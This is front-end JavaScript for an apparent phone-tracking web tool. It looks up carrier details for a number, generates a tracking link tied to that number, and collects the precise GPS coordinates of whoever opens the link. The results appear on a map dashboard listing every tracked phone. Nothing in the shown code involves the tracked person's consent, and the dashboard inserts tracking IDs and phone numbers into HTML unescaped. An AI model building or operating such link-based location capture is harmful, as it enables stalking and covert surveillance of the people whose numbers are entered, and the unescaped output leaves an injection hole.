// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        // Remove active class from all tabs and contents
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

        // Add active class to clicked tab and corresponding content
        this.classList.add('active');
        document.getElementById(this.dataset.tab).classList.add('active');

        // Initialize dashboard map if switching to dashboard
        if (this.dataset.tab === 'dashboard') {
            initDashboardMap();
            loadAllLocations();
        }
    });
});

// Phone number lookup
document.getElementById('lookup-btn').addEventListener('click', lookupPhone);
document.getElementById('phone-input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') lookupPhone();
});

function lookupPhone() {
    const phoneNumber = document.getElementById('phone-input').value.trim();

    if (!phoneNumber) {
        showError('Please enter a phone number');
        return;
    }

    // Hide previous results
    document.getElementById('lookup-result').classList.add('hidden');
    document.getElementById('lookup-error').classList.add('hidden');

    fetch('/lookup', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ phone_number: phoneNumber })
    })
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            displayLookupResult(result.data);
        } else {
            showError(result.error);
        }
    })
    .catch(error => {
        showError('An error occurred. Please try again.');
    });
}

function displayLookupResult(data) {
    document.getElementById('result-phone').textContent = data.phone_number;
    document.getElementById('result-country').textContent = data.country;
    document.getElementById('result-code').textContent = data.country_code;
    document.getElementById('result-carrier').textContent = data.carrier;
    document.getElementById('result-type').textContent = data.number_type;
    document.getElementById('result-timezone').textContent = data.timezones.join(', ');

    document.getElementById('lookup-result').classList.remove('hidden');
}

function showError(message) {
    const errorBox = document.getElementById('lookup-error');
    errorBox.textContent = message;
    errorBox.classList.remove('hidden');
}

// Generate tracking link
document.getElementById('generate-btn').addEventListener('click', generateLink);

function generateLink() {
    const phoneNumber = document.getElementById('track-phone').value.trim();

    fetch('/generate-link', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ phone_number: phoneNumber })
    })
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            document.getElementById('tracking-url').value = result.tracking_url;
            document.getElementById('tracking-id-display').textContent = result.tracking_id;
            document.getElementById('link-result').classList.remove('hidden');
        }
    })
    .catch(error => {
        alert('An error occurred. Please try again.');
    });
}

// Copy tracking link
document.getElementById('copy-btn').addEventListener('click', function() {
    const urlInput = document.getElementById('tracking-url');
    urlInput.select();
    document.execCommand('copy');

    this.textContent = 'Copied!';
    setTimeout(() => {
        this.textContent = 'Copy';
    }, 2000);
});

// Check location by tracking ID
document.getElementById('check-btn').addEventListener('click', checkLocation);

let singleMap = null;
let singleMarker = null;

function checkLocation() {
    const trackingId = document.getElementById('check-tracking-id').value.trim();

    if (!trackingId) {
        alert('Please enter a tracking ID');
        return;
    }

    document.getElementById('location-result').classList.add('hidden');
    document.getElementById('location-pending').classList.add('hidden');

    fetch(`/get-location/${trackingId}`)
    .then(response => response.json())
    .then(result => {
        if (result.success && result.data.location) {
            displayLocationResult(result.data);
        } else if (result.success) {
            document.getElementById('location-pending').classList.remove('hidden');
        } else {
            alert('Tracking ID not found');
        }
    })
    .catch(error => {
        alert('An error occurred. Please try again.');
    });
}

function displayLocationResult(data) {
    const loc = data.location;

    document.getElementById('loc-lat').textContent = loc.latitude.toFixed(6);
    document.getElementById('loc-lng').textContent = loc.longitude.toFixed(6);
    document.getElementById('loc-accuracy').textContent = loc.accuracy.toFixed(0) + ' meters';
    document.getElementById('loc-time').textContent = new Date(loc.timestamp).toLocaleString();

    document.getElementById('location-result').classList.remove('hidden');

    // Initialize or update map
    setTimeout(() => {
        if (!singleMap) {
            singleMap = L.map('single-map').setView([loc.latitude, loc.longitude], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap contributors'
            }).addTo(singleMap);
        } else {
            singleMap.setView([loc.latitude, loc.longitude], 15);
        }

        if (singleMarker) {
            singleMap.removeLayer(singleMarker);
        }

        singleMarker = L.marker([loc.latitude, loc.longitude]).addTo(singleMap);
        singleMarker.bindPopup(`<strong>Location Found!</strong><br>Accuracy: ${loc.accuracy.toFixed(0)}m`).openPopup();

        // Add accuracy circle
        L.circle([loc.latitude, loc.longitude], {
            radius: loc.accuracy,
            color: '#667eea',
            fillColor: '#667eea',
            fillOpacity: 0.2
        }).addTo(singleMap);
    }, 100);
}

// Dashboard
let dashboardMap = null;
let dashboardMarkers = [];

function initDashboardMap() {
    if (!dashboardMap) {
        setTimeout(() => {
            dashboardMap = L.map('dashboard-map').setView([20, 0], 2);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap contributors'
            }).addTo(dashboardMap);
        }, 100);
    }
}

document.getElementById('refresh-btn').addEventListener('click', loadAllLocations);

function loadAllLocations() {
    fetch('/api/all-locations')
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            displayAllLocations(result.data);
        }
    })
    .catch(error => {
        console.error('Error loading locations:', error);
    });
}

function displayAllLocations(data) {
    const listContainer = document.getElementById('locations-list');

    // Clear existing markers
    dashboardMarkers.forEach(marker => {
        if (dashboardMap) dashboardMap.removeLayer(marker);
    });
    dashboardMarkers = [];

    if (Object.keys(data).length === 0) {
        listContainer.innerHTML = '<p style="text-align: center; color: #888; padding: 20px;">No tracking data yet.</p>';
        return;
    }

    let html = '';
    const bounds = [];

    for (const [trackingId, info] of Object.entries(data)) {
        const hasLocation = info.location !== null;

        html += `
            <div class="location-item">
                <span class="tracking-id">${trackingId}</span>
                <div class="coords">
                    ${hasLocation
                        ? `${info.location.latitude.toFixed(6)}, ${info.location.longitude.toFixed(6)}`
                        : `Phone: ${info.phone_number || 'N/A'}`
                    }
                </div>
                <span class="status ${hasLocation ? 'received' : 'pending'}">
                    ${hasLocation ? 'Received' : 'Pending'}
                </span>
            </div>
        `;

        if (hasLocation && dashboardMap) {
            const marker = L.marker([info.location.latitude, info.location.longitude])
                .addTo(dashboardMap)
                .bindPopup(`
                    <strong>ID:</strong> ${trackingId}<br>
                    <strong>Phone:</strong> ${info.phone_number || 'N/A'}<br>
                    <strong>Time:</strong> ${new Date(info.location.timestamp).toLocaleString()}
                `);
            dashboardMarkers.push(marker);
            bounds.push([info.location.latitude, info.location.longitude]);
        }
    }

    listContainer.innerHTML = html;

    // Fit map to markers
    if (bounds.length > 0 && dashboardMap) {
        dashboardMap.fitBounds(bounds, { padding: [50, 50] });
    }
}
